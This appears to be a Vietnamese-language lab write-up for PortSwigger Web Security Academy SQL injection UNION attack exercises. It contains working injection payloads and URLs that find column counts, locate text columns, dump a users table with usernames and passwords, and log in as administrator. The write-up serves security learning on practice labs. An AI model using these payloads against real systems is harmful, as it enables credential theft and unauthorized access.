![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/9089c6dc-3fdb-4f8f-930f-eab8f8bbf111)+ dùng phương pháp tấn công: SQL injection UNION attacks
+ số lượng cột đầu ra bổ cung phải bằng số cột của truy vấn ban đầu
+ loại data của đầu ra bổ sung phải cùng loại với truy vấn ban đầu<br>
-> phải tìm số cột và loại data truy vấn ban đầu <br>

I. Determining the number of columns required<br>
1. Lý thuyết<br>
- dùng ORDER BY<br>
' ORDER BY 1--<br>
' ORDER BY 2--<br>
cho đến khi nào phản hồi kết quả<br>
- dùng UNION SELECT<br>
' UNION SELECT NULL--<br>
' UNION SELECT NULL,NULL--<br>
cho đến khi phản hồi kết quả<br>

2. Lab: SQL injection UNION attack, determining the number of columns returned by the query<br>
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION
attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this
technique in subsequent labs to construct the full attack.To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that
 returns an additional row containing null values.<br>
https://portswigger.net/academy/labs/launch/c0cf223d86b3189ea471d7a4dfe43987f9306dcd549be77599964da1b517b307?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-determine-number-of-columns<br>

3. Giải<br>
https://0aec00dc03d3bb3380e976ed007000cc.web-security-academy.net/filter?category=Accessories%20%27+UNION+SELECT+NULL,NULL,NULL--<br>

II. Database-specific syntax<br>
1. Lý thuyết<br>
- trên Oracle, SELECT phải đi với FROM và nó có bảng dựng sẵn dual cho mục đích này<br>
-> truy vấn sẽ có dạng: ' UNION SELECT NULL FROM DUAL--<br>
- (--) biểu thị comment, ngoài ra (#) cx đc dùng để biểu thị comment<br>

III. Finding columns with a useful data type<br>
1. Lý thuyết<br>
- loại dữ liệu thường là dạng string nên trong UNION SELECT thay NULL bằng string để xem cột nào phù hợp để xài<br>
- VD:<br>
' UNION SELECT 'a',NULL,NULL,NULL--<br>
' UNION SELECT NULL,'a',NULL,NULL--<br>
' UNION SELECT NULL,NULL,'a',NULL--<br>
' UNION SELECT NULL,NULL,NULL,'a'--<br>

2. Lab: SQL injection UNION attack, finding a column containing text<br>
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response,
so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query.
You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional
row containing the value provided. This technique helps you determine which columns are compatible with string data.<br>
https://portswigger.net/academy/labs/launch/dc3ff4b519f1a96f0bd7507a607ced9ca7f87900eb196d0a9b25001de1833f5e?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-find-column-containing-text<br>

3. Giải<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/e863a95e-5838-4810-aedf-63a855965b94)<br>

-> string đưa vào truy vấn là: rPGbN0<br>
- tìm số cột được yêu cầu: https://0ad3008404bed85481ac348c00010071.web-security-academy.net/filter?category=Accessories%20%27+UNION+SELECT+NULL,NULL,NULL--<br>
- dùng string để tìm cột thỏa mãn: https://0ad3008404bed85481ac348c00010071.web-security-academy.net/filter?category=Accessories%20%27+UNION+SELECT+NULL,%27rPGbN0%27,NULL--<br>

IV. Using a SQL injection UNION attack to retrieve interesting data<br>
1. Lab: SQL injection UNION attack, retrieving data from other tables<br>
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response,
so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.<br>
https://portswigger.net/academy/labs/launch/c94c990a42d1b1f39e53806b1d0d1ad51a43e1f2d5ec1a602c144d7817d3e91c?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-retrieve-data-from-other-tables<br>

2. Giải<br>
- tìm kiến số cột (2 cột): https://0af100ee041f27b08159573c00140028.web-security-academy.net/filter?category=Corporate+gifts%20%27+UNION+SELECT+NULL,NULL--<br>
- tìm só cột can tạo chuỗi string (2 cột): https://0af100ee041f27b08159573c00140028.web-security-academy.net/filter?category=Corporate+gifts%20%27+UNION+SELECT+%27a%27,%27a%27--
- lấy all user và password: https://0af100ee041f27b08159573c00140028.web-security-academy.net/filter?category=Corporate+gifts%20%27+UNION+SELECT+username,+password+FROM+users--<br>
- thu được kết quả<br>
```
carlos
xzn6wsrxwocejcfxvxa5
wiener
3msla35wbnl4bfnteb83
administrator
di85ims27anua2ivz0ym
```
<br> -> dùng tài khoản administrator để login<br>

V. Retrieving multiple values within a single column<br>
1. Lab: SQL injection UNION attack, retrieving multiple values in a single column<br>
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's
response so you can use a UNION attack to retrieve data from other tables.
The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.<br>
https://portswigger.net/academy/labs/launch/7c96fa50c7c53c9f9c96467a8b9e76f070dafcf9bfdcc4f04fc786ef0b0819d2?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-retrieve-multiple-values-in-single-column<br>

2. Giải<br>
- tìm số cột có và số cột can xây dựng string -> chỉ có cột thứ 2 thỏa mãn
- tìm kiếm tài khoản: https://0a3300e203b0863f87a39848002e008a.web-security-academy.net/filter?category=Accessories%20%27+UNION+SELECT+NULL,+username+||+%27~%27+||+password+FROM+users--<br>
- kết quả thu được:<br>
```

wiener~c5nyq14fa7cpqalakr0g
carlos~wyhtnbiva5bu33xf27v9
administrator~5nqtjpdemq9jk31uyhmf
```
<br>-> login bằng tài khoản administrator
